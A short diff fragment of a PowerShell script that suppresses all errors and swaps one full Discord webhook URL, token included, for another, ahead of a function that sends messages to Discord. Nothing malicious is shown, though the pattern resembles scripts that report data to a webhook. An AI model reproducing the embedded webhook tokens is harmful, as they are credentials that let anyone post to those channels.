@@ -7,7 +7,7 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # 1) DISCORD WEBHOOK URL
-$DiscordWebhookUrl = "https://discord.com/api/webhooks/1321463940802416662/vEfq26I3sIET-oKyzZxFPKsY4NaZ3HWLv1yUxkd9og6eZTHgxanJo4lYxkXL3Atx9pXN"
+$DiscordWebhookUrl = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"
 
 # 2) FUNCTION TO SEND A MESSAGE TO DISCORD
 function Send-DiscordMessage {
